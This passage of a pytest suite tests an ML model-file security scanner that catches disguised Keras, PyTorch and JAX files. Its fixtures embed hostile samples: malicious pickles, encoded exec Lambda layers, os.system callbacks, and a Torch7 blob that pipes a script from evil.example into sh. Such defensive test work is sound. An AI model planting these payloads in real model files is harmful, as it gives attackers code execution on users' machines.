    ) -> bool:
        assert allowed_shard_paths is None
        assert allowed_shard_targets is None
        return True

    monkeypatch.setattr(core_module, "should_use_advanced_handler", always_use_advanced_handler)
    monkeypatch.setattr(core_module, "scan_advanced_large_file", scan_advanced_without_cache)

    result = scan_file(
        str(disguised_keras),
        config={"cache_enabled": True, "cache_dir": str(tmp_path / "cache"), "min_cache_file_size": 0},
    )

    assert result.scanner_name == "zip"
    assert result.success is False
    assert result.metadata["operational_error_reason"] == "recognized_format_scanner_unavailable"


def test_scan_file_preserves_generic_findings_when_content_routed_keras_zip_scanner_unavailable(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    disguised_keras = tmp_path / "model.jpg"
    _create_misnamed_zip(
        disguised_keras,
        {
            "config.json": json.dumps({"class_name": "Sequential", "config": {"layers": []}}).encode("utf-8"),
            "metadata.json": json.dumps({"keras_version": "3.0.0"}).encode("utf-8"),
            "payload.pkl": _build_malicious_pickle(),
        },
    )
    original_load_scanner = core_module._registry._load_scanner

    def load_scanner(scanner_id: str) -> type[Any] | None:
        if scanner_id == "keras_zip":
            return None
        return original_load_scanner(scanner_id)

    monkeypatch.setattr(core_module._registry, "_load_scanner", load_scanner)

    result = scan_file(str(disguised_keras), config={"cache_enabled": False})

    assert result.scanner_name == "zip"
    assert result.success is False
    assert result.metadata["operational_error_reason"] == "recognized_format_scanner_unavailable"
    _assert_system_pickle_detected(result, "payload.pkl")


def test_scan_file_unavailable_keras_scanner_restores_whitelist_downgrade(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    disguised_keras = tmp_path / "model.keras"
    _create_misnamed_zip(
        disguised_keras,
        {
            "config.json": json.dumps({"class_name": "Sequential", "config": {"layers": []}}).encode("utf-8"),
            "metadata.json": json.dumps({"keras_version": "3.0.0"}).encode("utf-8"),
        },
    )
    original_load_scanner = core_module._registry._load_scanner

    def load_scanner(scanner_id: str) -> type[Any] | None:
        if scanner_id == "keras_zip":
            return None
        return original_load_scanner(scanner_id)

    def scan_with_whitelisted_finding(self: ZipScanner, path: str) -> ScanResult:
        self.context = UnifiedMLContext(
            file_path=Path(path),
            file_size=Path(path).stat().st_size,
            file_type=".keras",
            model_id=next(iter(POPULAR_MODELS)),
            model_source="huggingface",
        )
        result = self._create_result()
        result.add_check(
            name="Fallback Security Finding",
            passed=False,
            message="High confidence fallback anomaly",
            severity=IssueSeverity.CRITICAL,
            rule_code="CUSTOM001",
        )
        result.finish(success=True)
        assert result.issues[0].severity == IssueSeverity.INFO
        return result

    monkeypatch.setattr(core_module._registry, "_load_scanner", load_scanner)
    monkeypatch.setattr(ZipScanner, "scan", scan_with_whitelisted_finding)

    result = scan_file(str(disguised_keras), config={"cache_enabled": False})

    assert result.success is False
    assert result.issues[0].severity == IssueSeverity.CRITICAL
    assert result.issues[0].details["whitelist_downgrade_restored"] is True
    assert result.metadata["operational_error_reason"] == "recognized_format_scanner_unavailable"


def test_scan_file_routes_misnamed_oversized_config_only_keras_zip_by_content(tmp_path: Path) -> None:
    disguised_keras = tmp_path / "model.jpg"
    malicious_code = "exec(\"print('Malicious!')\")"
    encoded_code = base64.b64encode(malicious_code.encode()).decode()
    config = {
        "class_name": "Functional",
        "config": {
            "layers": [
                {"class_name": "InputLayer", "name": "input_1", "config": {}},
                {
                    "class_name": "Lambda",
                    "name": "lambda_1",
                    "config": {"function": [encoded_code, None, None], "function_type": "lambda"},
                },
            ]
        },
        "padding": "A" * (5 * 1024 * 1024),
    }
    with zipfile.ZipFile(disguised_keras, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("config.json", json.dumps(config))

    result = scan_file(str(disguised_keras))

    assert result.scanner_name == "keras_zip"
    assert any("lambda" in issue.message.lower() for issue in result.issues)


def test_scan_file_does_not_route_misnamed_oversized_generic_config_to_keras(tmp_path: Path) -> None:
    disguised_zip = tmp_path / "repo.jpg"
    generic_config = {
        "model_type": "bert",
        "architectures": ["BertModel"],
        "padding": "A" * (5 * 1024 * 1024),
    }
    with zipfile.ZipFile(disguised_zip, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("config.json", json.dumps(generic_config))

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"
    assert not any(check.name.startswith("Keras ZIP") for check in result.checks)


def test_scan_file_recursively_scans_embedded_pickle_in_content_routed_keras_zip(tmp_path: Path) -> None:
    disguised_keras = tmp_path / "model.jpg"
    _create_misnamed_zip(
        disguised_keras,
        {
            "config.json": json.dumps({"class_name": "Sequential", "config": {"layers": []}}).encode("utf-8"),
            "payload.pkl": _build_malicious_pickle(),
        },
    )

    result = scan_file(str(disguised_keras))

    assert result.scanner_name == "keras_zip"
    assert result.success is False
    _assert_system_pickle_detected(result, "payload.pkl")
    assert result.metadata.get("model_class") == "Sequential"


def test_scan_file_scans_shadowed_duplicate_pickle_members_in_content_routed_keras_zip(tmp_path: Path) -> None:
    disguised_keras = tmp_path / "model.jpg"
    _create_zip_with_ordered_entries(
        disguised_keras,
        [
            ("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}).encode("utf-8")),
            ("payload.pkl", _build_malicious_pickle()),
            ("payload.pkl", pickle.dumps({"safe": True})),
        ],
    )

    result = scan_file(str(disguised_keras))

    assert result.scanner_name == "keras_zip"
    assert result.success is False
    _assert_system_pickle_detected(result, "payload.pkl")


def test_scan_file_content_routed_keras_zip_with_benign_extra_member_stays_clean(tmp_path: Path) -> None:
    disguised_keras = tmp_path / "model.jpg"
    _create_misnamed_zip(
        disguised_keras,
        {
            "config.json": json.dumps({"class_name": "Sequential", "config": {"layers": []}}).encode("utf-8"),
            "notes.txt": b"safe archive member",
        },
    )

    result = scan_file(str(disguised_keras))

    assert result.scanner_name == "keras_zip"
    assert result.success is True
    assert result.issues == []


def test_scan_file_content_routed_keras_zip_with_benign_pickle_member_stays_clean(tmp_path: Path) -> None:
    disguised_keras = tmp_path / "model.jpg"
    _create_misnamed_zip(
        disguised_keras,
        {
            "config.json": json.dumps({"class_name": "Sequential", "config": {"layers": []}}).encode("utf-8"),
            "weights.pkl": pickle.dumps({"weights": [1, 2, 3], "bias": [0.1, 0.2]}),
        },
    )

    result = scan_file(str(disguised_keras))

    assert result.scanner_name == "keras_zip"
    assert result.success is True
    assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)


def test_scan_file_content_routed_keras_zip_with_duplicate_benign_pickle_members_stays_clean(tmp_path: Path) -> None:
    disguised_keras = tmp_path / "model.jpg"
    safe_payload = pickle.dumps({"weights": [1, 2, 3], "bias": [0.1, 0.2]})
    _create_zip_with_ordered_entries(
        disguised_keras,
        [
            ("config.json", json.dumps({"class_name": "Sequential", "config": {"layers": []}}).encode("utf-8")),
            ("weights.pkl", safe_payload),
            ("weights.pkl", safe_payload),
        ],
    )

    result = scan_file(str(disguised_keras))

    assert result.scanner_name == "keras_zip"
    assert result.success is True
    assert not any(issue.severity in (IssueSeverity.WARNING, IssueSeverity.CRITICAL) for issue in result.issues)


def test_scan_file_routes_config_only_keras_by_suffix(tmp_path: Path) -> None:
    keras_model = tmp_path / "model.keras"
    _create_misnamed_zip(
        keras_model,
        {
            "config.json": json.dumps({"class_name": "Sequential", "config": {"layers": []}}).encode("utf-8"),
        },
    )

    result = scan_file(str(keras_model))

    assert result.scanner_name == "keras_zip"
    assert result.success


def test_scan_file_routes_misnamed_pytorch_zip_by_content(tmp_path: Path) -> None:
    disguised_torch = tmp_path / "model.jpg"
    _create_misnamed_zip(
        disguised_torch,
        {
            "data.pkl": _build_malicious_pickle(),
            "version": b"1.6",
        },
    )

    result = scan_file(str(disguised_torch))

    assert result.scanner_name == "pytorch_zip"
    assert any("data.pkl" in (issue.location or "") for issue in result.issues)


@pytest.mark.parametrize(
    ("pickle_member", "storage_member"),
    [("data.pkl", "data/0"), ("archive/data.pkl", "archive/data/0")],
)
def test_scan_file_routes_misnamed_pytorch_zip_with_storage_but_no_metadata(
    tmp_path: Path,
    pickle_member: str,
    storage_member: str,
) -> None:
    disguised_torch = tmp_path / f"metadata-stripped-{pickle_member.replace('/', '-')}.jpg"
    _create_misnamed_zip(
        disguised_torch,
        {
            pickle_member: _build_malicious_pickle(),
            storage_member: b"tensor-storage",
        },
    )

    result = scan_file(str(disguised_torch))

    assert result.scanner_name == "pytorch_zip"
    assert any(pickle_member in (issue.location or "") for issue in result.issues)


@pytest.mark.parametrize(
    ("pickle_member", "near_storage_member"),
    [
        ("data.pkl", "data/readme.txt"),
        ("data.pkl", "data/0abc"),
        ("data.pkl", "data/weights.v2"),
        ("data.pkl", "data/0/readme.txt"),
        ("archive/data.pkl", "archive/data/readme.txt"),
        ("archive/data.pkl", "archive/data/0abc"),
        ("archive/data.pkl", "archive/data/weights.v2"),
        ("archive/data.pkl", "archive/data/0/readme.txt"),
    ],
)
def test_scan_file_does_not_route_generic_data_directory_to_pytorch_zip(
    tmp_path: Path,
    pickle_member: str,
    near_storage_member: str,
) -> None:
    disguised_zip = tmp_path / f"generic-data-dir-{pickle_member.replace('/', '-')}.jpg"
    _create_misnamed_zip(
        disguised_zip,
        {
            pickle_member: _build_malicious_pickle(),
            near_storage_member: b"not tensor storage",
        },
    )

    result = scan_file(str(disguised_zip))

    assert result.scanner_name == "zip"
    _assert_system_pickle_detected(result, pickle_member)


@pytest.mark.parametrize("suffix", [".pt", ".pth", ".ckpt", ".bin", ".pkl"])
def test_scan_file_routes_zip_backed_torch_suffix_collisions_to_pytorch_zip(
    tmp_path: Path,
    suffix: str,
) -> None:
    model_path = create_mock_pytorch_zip(tmp_path / f"weights{suffix}")

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "pytorch_zip"
    assert result.success is True
    assert result.metadata.get("pickle_files")


@pytest.mark.parametrize("suffix", [".pt", ".pth", ".ckpt", ".pkl"])
def test_scan_file_routes_raw_pickle_torch_suffix_collisions_to_pickle(
    tmp_path: Path,
    suffix: str,
) -> None:
    model_path = tmp_path / f"weights{suffix}"
    model_path.write_bytes(pickle.dumps({"weights": [1, 2, 3]}, protocol=4))

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "pickle"
    assert result.success is True


def test_scan_file_routes_jax_pickles_through_jax_specific_analysis(tmp_path: Path) -> None:
    model_path = tmp_path / "state.pickle"
    model_path.write_bytes(
        pickle.dumps(
            {
                "framework": "jax",
                "payload": "jax.experimental.io_callback",
            }
        )
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "pickle"
    assert any(
        check.name == "JAX Pattern Security Check"
        and check.status == CheckStatus.FAILED
        and check.details["pattern"] == r"jax\.experimental\.io_callback"
        for check in result.checks
    )


def test_scan_file_routes_malicious_renamed_jax_json_without_routing_ajax_near_match(tmp_path: Path) -> None:
    model_path = tmp_path / "state.jpg"
    native_model_path = tmp_path / "state.checkpoint"
    near_match_path = tmp_path / "ajax.jpg"
    malicious_payload = (" " * 1024) + json.dumps(
        {
            "framework": "jax",
            "payload": "jax.experimental.host_callback.call(os.system, 'id')",
        }
    )
    model_path.write_text(malicious_payload, encoding="utf-8")
    native_model_path.write_text(malicious_payload, encoding="utf-8")
    near_match_path.write_text(
        json.dumps({"framework": "ajax", "payload": "jax.experimental.host_callback.call(os.system, 'id')"}),
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})
    native_result = scan_file(str(native_model_path), config={"cache_scan_results": False})
    near_match_result = scan_file(str(near_match_path), config={"cache_scan_results": False})

    assert result.scanner_name == "jax_checkpoint"
    assert native_result.scanner_name == "jax_checkpoint"
    assert any(
        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
    )
    assert any(
        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED
        for check in native_result.checks
    )
    assert near_match_result.scanner_name == "unknown"
    assert near_match_result.success is True


def test_scan_file_composes_jax_analysis_for_mxnet_shaped_json(tmp_path: Path) -> None:
    model_path = tmp_path / "jax-mxnet-overlap.jpg"
    model_path.write_text(
        json.dumps(
            {
                "framework": "jax",
                "nodes": [{"op": "null", "name": "data"}],
                "arg_nodes": [0],
                "heads": [[0, 0, 0]],
                "payload": "jax.experimental.host_callback.call(os.system, 'id')",
            }
        ),
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "mxnet"
    assert result.success is False
    assert any(
        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
    )


def test_scan_file_composes_jax_analysis_for_xgboost_shaped_json(tmp_path: Path) -> None:
    model_path = tmp_path / "jax-xgboost-overlap.json"
    model_path.write_text(
        json.dumps(
            {
                "framework": "jax",
                "version": [1, 7, 4],
                "learner": {"gradient_booster": {}},
                "payload": "jax.experimental.host_callback.call(os.system, 'id')",
            }
        ),
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "xgboost"
    assert result.success is False
    assert any(
        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
    )


@pytest.mark.parametrize("foreign_owner", ["mxnet", "xgboost"])
def test_scan_file_large_foreign_json_does_not_compose_ambiguous_jax_analysis(
    tmp_path: Path,
    foreign_owner: str,
) -> None:
    model_path = tmp_path / f"large-{foreign_owner}.json"
    payload: dict[str, Any]
    if foreign_owner == "mxnet":
        payload = {
            "nodes": [{"op": "null", "name": "data"}],
            "arg_nodes": [0],
            "heads": [[0, 0, 0]],
        }
    else:
        payload = {"version": [1, 7, 4], "learner": {"gradient_booster": {}}}
    payload["padding"] = "x" * (JAX_JSON_CHECKPOINT_ROUTING_READ_BYTES + 16)
    model_path.write_text(json.dumps(payload), encoding="utf-8")

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == foreign_owner
    assert result.success is True
    assert "jax_json_checkpoint_analysis_size_limit" not in result.metadata.get("scan_outcome_reasons", [])
    assert not any(check.name == "JSON Checkpoint Analysis Limit" for check in result.checks)


@pytest.mark.parametrize("foreign_owner", ["mxnet", "xgboost"])
def test_scan_file_large_confirmed_jax_foreign_overlap_is_inconclusive_not_cached(
    tmp_path: Path,
    foreign_owner: str,
) -> None:
    model_path = tmp_path / f"large-jax-{foreign_owner}.json"
    payload: dict[str, Any] = {"framework": "jax"}
    if foreign_owner == "mxnet":
        payload.update(
            {
                "nodes": [{"op": "null", "name": "data"}],
                "arg_nodes": [0],
                "heads": [[0, 0, 0]],
            }
        )
    else:
        payload.update({"version": [1, 7, 4], "learner": {"gradient_booster": {}}})
    payload["padding"] = "x" * (JAX_JSON_CHECKPOINT_ROUTING_READ_BYTES + 16)
    model_path.write_text(json.dumps(payload), encoding="utf-8")
    cache_dir = tmp_path / "cache"

    reset_cache_manager()
    try:
        for aggregate in (
            scan_model_directory_or_file(
                str(model_path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            ),
            scan_model_directory_or_file(
                str(model_path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            ),
        ):
            metadata = aggregate.file_metadata[str(model_path)]
            assert metadata["scan_outcome"] == "inconclusive"
            assert "jax_json_checkpoint_analysis_size_limit" in metadata["scan_outcome_reasons"]
            assert core_module.determine_exit_code(aggregate) == 2
            assert foreign_owner in aggregate.scanner_names
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


@pytest.mark.parametrize("suffix", [".ckpt", ".pickle"])
def test_scan_file_routes_jax_json_on_pickle_owned_suffixes_through_jax_analysis(tmp_path: Path, suffix: str) -> None:
    model_path = tmp_path / f"state{suffix}"
    model_path.write_text(
        json.dumps({"framework": "jax", "payload": "jax.experimental.host_callback.call(os.system, 'id')"}),
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "jax_checkpoint"
    assert result.metadata["scanner_dependency_ids"] == ["jax_checkpoint"]
    assert any(
        check.name == "JSON Pattern Security Check" and check.status == CheckStatus.FAILED for check in result.checks
    )


@pytest.mark.parametrize("suffix", [".ckpt", ".pickle"])
def test_scan_file_accepts_benign_jax_json_on_pickle_owned_suffixes(tmp_path: Path, suffix: str) -> None:
    model_path = tmp_path / f"benign-state{suffix}"
    model_path.write_text(json.dumps({"framework": "jax", "weights": [1, 2, 3]}), encoding="utf-8")

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "jax_checkpoint"
    assert result.success is True
    assert not any(
        check.name in {"File Type Validation", "Format Validation"} and check.status == CheckStatus.FAILED
        for check in result.checks
    )


def test_scan_file_fails_closed_for_oversized_renamed_jax_json_and_does_not_cache_result(tmp_path: Path) -> None:
    model_path = tmp_path / "large-state.jpg"
    near_match_path = tmp_path / "large-ajax.jpg"
    padding = "x" * (JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES + 16)
    model_path.write_text(
        json.dumps(
            {
                "padding": padding,
                "framework": "jax",
                "payload": "jax.experimental.host_callback.call(os.system, 'id')",
            }
        ),
        encoding="utf-8",
    )
    near_match_path.write_text(json.dumps({"padding": padding, "framework": "ajax"}), encoding="utf-8")
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    reset_cache_manager()
    try:
        first = scan_file(str(model_path), config=config)
        second = scan_file(str(model_path), config=config)
        near_match_result = scan_file(str(near_match_path), config={"cache_scan_results": False})

        assert first.scanner_name == "jax_checkpoint"
        assert first.success is False
        assert second.success is False
        assert first.metadata["scan_outcome"] == "inconclusive"
        assert "jax_json_checkpoint_analysis_size_limit" in first.metadata["scan_outcome_reasons"]
        assert near_match_result.scanner_name == "unknown"
        assert near_match_result.success is True
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()

    aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_reports_visible_jax_pattern_before_oversized_json_exit2(tmp_path: Path) -> None:
    model_path = tmp_path / "malicious-large.checkpoint"
    model_path.write_text(
        json.dumps(
            {
                "framework": "jax",
                "payload": "jax.experimental.host_callback.call(os.system, 'id')",
                "padding": "x" * (JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES + 16),
            }
        ),
        encoding="utf-8",
    )

    aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)

    assert core_module.determine_exit_code(aggregate) == 1
    assert any("Suspicious pattern in bounded JSON checkpoint prefix" in issue.message for issue in aggregate.issues)
    assert aggregate.file_metadata[str(model_path)]["scan_outcome"] == "inconclusive"


def test_scan_file_reports_visible_jax_pattern_after_depth_capped_prefix_value(tmp_path: Path) -> None:
    model_path = tmp_path / "depth-capped-prefix-large.checkpoint"
    deep_value: object = "benign"
    for _ in range(JaxCheckpointScanner._MAX_METADATA_TRAVERSAL_DEPTH + 1):
        deep_value = [deep_value]
    model_path.write_text(
        json.dumps(
            {
                "framework": "jax",
                "deep": deep_value,
                "payload": "jax.experimental.io_callback",
                "padding": "x" * (JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES + 16),
            }
        ),
        encoding="utf-8",
    )

    aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)

    assert core_module.determine_exit_code(aggregate) == 2
    assert any("Suspicious pattern in bounded JSON checkpoint prefix" in issue.message for issue in aggregate.issues)
    assert aggregate.file_metadata[str(model_path)]["scan_outcome"] == "inconclusive"
    assert "mxnet_symbol_routing_incomplete" in aggregate.file_metadata[str(model_path)]["scan_outcome_reasons"]


def test_scan_file_reports_visible_renamed_jax_pattern_behind_inconclusive_mxnet_depth_route(tmp_path: Path) -> None:
    model_path = tmp_path / "depth-capped-renamed-large.jpg"
    deep_value: object = "benign"
    for _ in range(JaxCheckpointScanner._MAX_METADATA_TRAVERSAL_DEPTH + 1):
        deep_value = [deep_value]
    model_path.write_text(
        json.dumps(
            {
                "framework": "jax",
                "deep": deep_value,
                "payload": "jax.experimental.io_callback",
                "padding": "x" * (JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES + 16),
            }
        ),
        encoding="utf-8",
    )

    aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)

    assert core_module.determine_exit_code(aggregate) == 2
    assert any("Suspicious pattern in bounded JSON checkpoint prefix" in issue.message for issue in aggregate.issues)
    assert aggregate.file_metadata[str(model_path)]["scan_outcome"] == "inconclusive"
    assert "mxnet_symbol_routing_incomplete" in aggregate.file_metadata[str(model_path)]["scan_outcome_reasons"]


def test_scan_file_reports_escaped_renamed_jax_pattern_behind_inconclusive_mxnet_depth_route(tmp_path: Path) -> None:
    model_path = tmp_path / "escaped-depth-capped-renamed-large.jpg"
    deep_value: object = "benign"
    for _ in range(JaxCheckpointScanner._MAX_METADATA_TRAVERSAL_DEPTH + 1):
        deep_value = [deep_value]
    payload = json.dumps(
        {
            "framework": "jax",
            "payload": "jax.experimental.io_callback",
            "deep": deep_value,
            "padding": "x" * (JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES + 16),
        }
    ).replace("jax.experimental.io_callback", r"j\u0061x\u002eexperimental\u002eio_callback")
    payload = payload.replace('"jax"', r'"j\u0061x"')
    model_path.write_text(payload, encoding="utf-8")

    aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)

    assert b"jax" not in model_path.read_bytes()[:JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES]
    assert core_module.determine_exit_code(aggregate) == 2
    assert any("Suspicious pattern in bounded JSON checkpoint prefix" in issue.message for issue in aggregate.issues)
    assert "mxnet_symbol_routing_incomplete" in aggregate.file_metadata[str(model_path)]["scan_outcome_reasons"]


def test_scan_file_inconclusive_mxnet_depth_route_does_not_compose_visible_ajax_near_match(tmp_path: Path) -> None:
    model_path = tmp_path / "depth-capped-renamed-ajax-large.jpg"
    deep_value: object = "benign"
    for _ in range(JaxCheckpointScanner._MAX_METADATA_TRAVERSAL_DEPTH + 1):
        deep_value = [deep_value]
    model_path.write_text(
        json.dumps(
            {
                "framework": "ajax",
                "deep": deep_value,
                "padding": "x" * (JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES + 16),
            }
        ),
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "unknown"
    assert result.metadata["scan_outcome_reasons"] == ["mxnet_symbol_routing_incomplete"]
    assert not any(check.name == "JSON Checkpoint Analysis Limit" for check in result.checks)


def test_scan_file_reports_visible_pattern_in_truncated_oversized_json_string(tmp_path: Path) -> None:
    model_path = tmp_path / "long-payload-malicious.checkpoint"
    model_path.write_text(
        json.dumps(
            {
                "framework": "jax",
                "payload": "jax.experimental.io_callback" + ("x" * (JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES + 16)),
            }
        ),
        encoding="utf-8",
    )

    aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)

    assert core_module.determine_exit_code(aggregate) == 1
    assert any("jax\\.experimental\\.io_callback" in issue.message for issue in aggregate.issues)
    assert aggregate.file_metadata[str(model_path)]["scan_outcome"] == "inconclusive"


def test_scan_file_decodes_visible_pattern_in_truncated_oversized_json_string(tmp_path: Path) -> None:
    model_path = tmp_path / "escaped-long-payload-malicious.checkpoint"
    model_path.write_text(
        '{"framework":"jax","payload":"jax\\u002eexperimental\\u002eio_callback'
        + ("x" * (JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES + 16))
        + '"}',
        encoding="utf-8",
    )

    aggregate = scan_model_directory_or_file(str(model_path), cache_scan_results=False)

    assert core_module.determine_exit_code(aggregate) == 1
    assert any("jax\\.experimental\\.io_callback" in issue.message for issue in aggregate.issues)
    assert aggregate.file_metadata[str(model_path)]["scan_outcome"] == "inconclusive"


def test_scan_file_does_not_report_pattern_from_oversized_trailing_json_document(tmp_path: Path) -> None:
    model_path = tmp_path / "trailing-document-large.checkpoint"
    model_path.write_text(
        '{"framework":"jax"}{"payload":"jax.experimental.io_callback","padding":"'
        + ("x" * (JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES + 16))
        + '"}',
        encoding="utf-8",
    )

    aggregate = scan_model_directory_or_file(
        str(model_path),
        scanners=["jax_checkpoint"],
        cache_scan_results=False,
    )

    assert core_module.determine_exit_code(aggregate) == 2
    assert all(
        "Suspicious pattern in bounded JSON checkpoint prefix" not in issue.message for issue in aggregate.issues
    )
    assert aggregate.file_metadata[str(model_path)]["scan_outcome"] == "inconclusive"


def test_scan_file_reports_visible_pattern_in_first_json_root_before_trailing_bytes(tmp_path: Path) -> None:
    model_path = tmp_path / "visible-malicious-root-with-trailing-bytes.checkpoint"
    model_path.write_text(
        '{"framework":"jax","payload":"jax.experimental.io_callback"}'
        + ("x" * (JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES + 16)),
        encoding="utf-8",
    )

    aggregate = scan_model_directory_or_file(
        str(model_path),
        scanners=["jax_checkpoint"],
        cache_scan_results=False,
    )

    assert core_module.determine_exit_code(aggregate) == 1
    assert any("Suspicious pattern in bounded JSON checkpoint prefix" in issue.message for issue in aggregate.issues)
    assert aggregate.file_metadata[str(model_path)]["scan_outcome"] == "inconclusive"


def test_scan_file_uses_final_duplicate_json_value_when_oversized_root_is_visible(tmp_path: Path) -> None:
    model_path = tmp_path / "visible-root-duplicate-value.checkpoint"
    model_path.write_text(
        '{"framework":"jax","payload":"jax.experimental.io_callback","payload":"benign"}'
        + (" " * (JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES + 16)),
        encoding="utf-8",
    )

    aggregate = scan_model_directory_or_file(
        str(model_path),
        scanners=["jax_checkpoint"],
        cache_scan_results=False,
    )

    assert core_module.determine_exit_code(aggregate) == 2
    assert all(
        "Suspicious pattern in bounded JSON checkpoint prefix" not in issue.message for issue in aggregate.issues
    )
    assert aggregate.file_metadata[str(model_path)]["scan_outcome"] == "inconclusive"


def test_scan_file_fails_closed_and_does_not_cache_bounded_jax_prefix_read_failure(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_path = tmp_path / "unreadable-prefix.checkpoint"
    model_path.write_text(
        json.dumps({"framework": "jax", "padding": "x" * (JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES + 16)}),
        encoding="utf-8",
    )
    cache_dir = tmp_path / "cache"

    def fail_prefix_read(_scanner: JaxCheckpointScanner, _path: str, _result: ScanResult) -> None:
        raise OSError("forced bounded prefix read failure")

    monkeypatch.setattr(JaxCheckpointScanner, "_scan_bounded_json_prefix_patterns", fail_prefix_read)
    reset_cache_manager()
    try:
        first = scan_model_directory_or_file(
            str(model_path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )
        second = scan_model_directory_or_file(
            str(model_path),
            cache_enabled=True,
            cache_dir=str(cache_dir),
            min_cache_file_size=0,
        )

        for aggregate in (first, second):
            metadata = aggregate.file_metadata[str(model_path)]
            assert aggregate.success is False
            assert core_module.determine_exit_code(aggregate) == 2
            assert metadata["scan_outcome"] == "inconclusive"
            assert metadata["operational_error_reason"] == "jax_json_checkpoint_prefix_pattern_read_failed"
            assert any(check.name == "JSON Bounded Prefix Pattern Scan" for check in aggregate.checks)
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_fails_closed_when_renamed_jax_json_root_is_past_routing_budget(tmp_path: Path) -> None:
    model_path = tmp_path / "late-root.jpg"
    model_path.write_text(
        (" " * (JAX_JSON_CHECKPOINT_ROUTING_READ_BYTES + 1)) + json.dumps({"framework": "jax"}),
        encoding="utf-8",
    )

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "jax_checkpoint"
    assert result.success is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert "jax_json_checkpoint_analysis_size_limit" in result.metadata["scan_outcome_reasons"]


def test_scan_file_routes_raw_bin_without_zip_structure_to_pytorch_binary(tmp_path: Path) -> None:
    model_path = tmp_path / "weights.bin"
    model_path.write_bytes(b"\x00" * 128)

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert result.scanner_name == "pytorch_binary"
    assert result.success is True


@pytest.mark.parametrize(
    ("payload", "supplemental_scanner"),
    [
        (b"RKNN\x01\x00\x00\x00payload" + _valid_elf64_header() + b"\x00" * 64, "rknn"),
        (b"T7\x00\x00payload torch.FloatTensor nn.Sequential " + _valid_elf64_header() + b"\x00" * 64, "torch7"),
        (
            b"\x0c\x00\x00\x00ET13\x04\x00\x04\x00\x04\x00\x00\x00" + _valid_elf64_header() + b"\x00" * 64,
            "executorch",
        ),
    ],
    ids=["rknn", "torch7", "executorch"],
)
def test_scan_file_preserves_bin_executable_detection_when_prefix_looks_like_other_format(
    tmp_path: Path,
    payload: bytes,
    supplemental_scanner: str,
) -> None:
    model_path = tmp_path / "weights.bin"
    model_path.write_bytes(payload)

    result = scan_file(str(model_path), config={"cache_scan_results": False})

    assert file_detection.detect_file_format(str(model_path)) == "pytorch_binary"
    assert result.scanner_name == "pytorch_binary"
    assert result.metadata["supplemental_scanners"] == [supplemental_scanner]
    assert any("Linux executable" in issue.message for issue in result.issues)


def test_scan_file_merges_torch7_security_analysis_for_signature_valid_bin(tmp_path: Path) -> None:
    model_path = tmp_path / "payload.bin"
    model_path.write_bytes(
        b"T7\x00\x00torch.FloatTensor nn.Sequential\n"
        b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
        b"local lib = package.loadlib('/tmp/evil.so', 'run')\n" + _valid_elf64_header() + b"\x00" * 64
    )

